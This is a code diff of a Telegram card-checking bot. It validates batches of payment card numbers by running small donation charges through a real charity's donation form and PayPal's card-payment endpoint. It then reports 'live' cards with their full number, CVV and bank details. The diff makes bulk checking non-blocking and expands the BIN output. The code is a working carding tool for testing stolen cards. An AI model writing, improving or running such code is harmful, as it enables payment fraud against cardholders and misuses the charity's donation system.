@@ -12,7 +12,7 @@ USERS_FILE = "users.json"
 APPROVED_USERS_FILE = "approved_users.json"
 
 fake = Faker()
-processing_files = {}
+processing_files = {}  # user_id -> bool for file check
 BIN_CACHE = {}
 
 BOT_OWNER = "@thispersonisbrand537"
@@ -50,7 +50,7 @@ def save_approved(approved):
     with open(APPROVED_USERS_FILE, 'w') as f:
         json.dump(approved, f)
 
-# ============ BIN LOOKUP (FIXED) ============
+# ============ BIN LOOKUP (cached) ============
 def get_bin_info(card_number):
     bin_num = card_number[:6]
     if bin_num in BIN_CACHE:
@@ -73,8 +73,8 @@ def get_bin_info(card_number):
             }
             BIN_CACHE[bin_num] = result
             return result
-    except Exception as e:
-        log(f"BIN lookup error: {e}", Colors.RED)
+    except:
+        pass
     result = {
         'bin': bin_num,
         'brand': 'UNKNOWN',
@@ -89,13 +89,16 @@ def get_bin_info(card_number):
     BIN_CACHE[bin_num] = result
     return result
 
-# ============ CARD CHECK (CMD style) ============
-def check_card(card_num, card_mon, card_yer, card_cvc):
+# ============ CARD CHECK (non-blocking) ============
+async def check_card_async(card_num, card_mon, card_yer, card_cvc):
+    """Run the blocking check_card in a thread to avoid blocking the event loop."""
+    return await asyncio.to_thread(_check_card_sync, card_num, card_mon, card_yer, card_cvc)
+
+def _check_card_sync(card_num, card_mon, card_yer, card_cvc):
     try:
         session = requests.Session()
         session.headers.update({'User-Agent': UserAgent().random})
         
-        # Get form data
         url = "https://www.brightercommunities.org/donate-form/"
         resp = session.get(url, timeout=10)
         if resp.status_code != 200:
@@ -111,7 +114,6 @@ def check_card(card_num, card_mon, card_yer, card_cvc):
         form_id = form_match.group(1)
         prefix = prefix_match.group(1)
         
-        # Create order
         order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
         payload = {
             'give-form-id-prefix': prefix,
@@ -133,12 +135,10 @@ def check_card(card_num, card_mon, card_yer, card_cvc):
         if not order_id:
             return "DIE_UNKNOWN"
         
-        # Card type
         first_digit = card_num[0]
         card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTERCARD', '6': 'DISCOVER'}
         card_type = card_types.get(first_digit, "UNKNOWN")
         
-        # PayPal GraphQL
         graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
         query = """
             mutation payWithCard($token: String!, $card: CardInput) {
@@ -177,7 +177,7 @@ def check_card(card_num, card_mon, card_yer, card_cvc):
     except Exception:
         return "DIE_UNKNOWN"
 
-# ============ FILE PROCESSING (with progress bar) ============
+# ============ FILE PROCESSING (non-blocking) ============
 async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, user_id):
     global processing_files
     cards = []
@@ -207,7 +207,6 @@ async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE,
     live_cards = []
     start_time = time.time()
     
-    # Initial progress message
     progress_msg = await update.message.reply_text(
         f"📁 FILE CHECK STARTED\n━━━━━━━━━━━━━━━━\n"
         f"📊 Total Cards: {total}\n"
@@ -222,7 +221,7 @@ async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE,
             await update.message.reply_text("⏹️ File check cancelled.")
             return
         
-        result = check_card(card['num'], card['mon'], card['yer'], card['cvc'])
+        result = await check_card_async(card['num'], card['mon'], card['yer'], card['cvc'])
         elapsed = int(time.time() - start_time)
         percent = int((i / total) * 100)
         
@@ -238,11 +237,12 @@ async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE,
             await update.message.reply_text(
                 f"✅ LIVE CARD #{len(live_cards)}\n"
                 f"💳 `{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}`\n"
-                f"{status} | {bin_info['brand']} - {bin_info['country']}",
+                f"{status} | {bin_info['brand']} - {bin_info['country']}\n"
+                f"🏦 Bank: {bin_info['bank']}\n"
+                f"🌍 Country: {bin_info['emoji']} {bin_info['country']}",
                 parse_mode='Markdown'
             )
         
-        # Update progress every card (better visibility)
         avg_time = elapsed / i if i > 0 else 0
         eta = int((total - i) * avg_time) if avg_time > 0 else 0
         try:
@@ -259,7 +259,7 @@ async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE,
         except:
             pass
         
-        await asyncio.sleep(1)  # small delay to avoid rate limits
+        await asyncio.sleep(1)
     
     await progress_msg.delete()
     total_time = int(time.time() - start_time)
@@ -314,11 +314,11 @@ Welcome {user_name}!
 ━━━━━━━━━━━━━━━━
 
 ⚡️ FEATURES:
-• Single Card Check
+• Single Card Check (with full BIN details)
 • Bulk File Check with Live Progress
-• BIN Lookup (Country/Bank)
+• BIN Lookup (Country/Bank/Brand)
 • Copy Card Details
-• Multi-User Support
+• True Multi-User Support (non-blocking)
 
 💡 HOW TO USE:
 
@@ -479,30 +479,42 @@ async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bin_info = get_bin_info(card_num)
     status_msg = await update.message.reply_text("⏳ CHECKING...")
     start = time.time()
-    result = check_card(card_num, card_mon, card_yer, card_cvc)
+    result = await check_card_async(card_num, card_mon, card_yer, card_cvc)
     elapsed = int(time.time() - start)
     await status_msg.delete()
     
     if result == "LIVE_CHARGED":
         status = "✅ LIVE CHARGED"
         emoji = "🔥"
+        extra = "• $0.50 charged successfully"
     elif result == "LIVE_CVV":
         status = "⚡️ CVV LIVE"
         emoji = "💳"
+        extra = "• CVV is correct, card valid"
     elif result == "LIVE_INSUFFICIENT":
-        status = "💰 INSUFFICIENT"
+        status = "💰 INSUFFICIENT FUNDS"
         emoji = "💵"
+        extra = "• Card valid but insufficient balance"
     else:
         status = "❌ DIE"
         emoji = "💀"
+        extra = "• Card invalid / expired / declined"
     
     text = f"""{emoji} {status}
 ━━━━━━━━━━━━━━━━
 💳 `{card_num}|{card_mon}|{card_yer}|{card_cvc}`
 
-🏦 {bin_info['brand']} - {bin_info['country']}
-📊 BIN: {bin_info['bin']}
-⏱️ {elapsed}s
+🏦 BIN INFORMATION:
+• BIN: `{bin_info['bin']}`
+• Brand: {bin_info['brand']}
+• Type: {bin_info['type']}
+• Level: {bin_info['level']}
+• Bank: {bin_info['bank']}
+• Country: {bin_info['emoji']} {bin_info['country']}
+• Bank Phone: {bin_info['phone']}
+
+📊 RESULT: {extra}
+⏱️ Time: {elapsed}s
 ━━━━━━━━━━━━━━━━
 👑 Bot by {BOT_OWNER}"""
     keyboard = [[InlineKeyboardButton("📋 COPY", callback_data=f"copy_{card_num}|{card_mon}|{card_yer}|{card_cvc}")]]
@@ -553,10 +565,9 @@ async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid BIN. Send first 6 digits only.\nExample: `400000`", parse_mode='Markdown')
         return
     
-    # Show "fetching" message
-    fetching_msg = await update.message.reply_text("🔍 Fetching BIN information...")
+    fetching = await update.message.reply_text("🔍 Fetching BIN information...")
     bin_info = get_bin_info(bin_num)
-    await fetching_msg.delete()
+    await fetching.delete()
     
     text = f"""🔍 BIN LOOKUP RESULT
 ━━━━━━━━━━━━━━━━
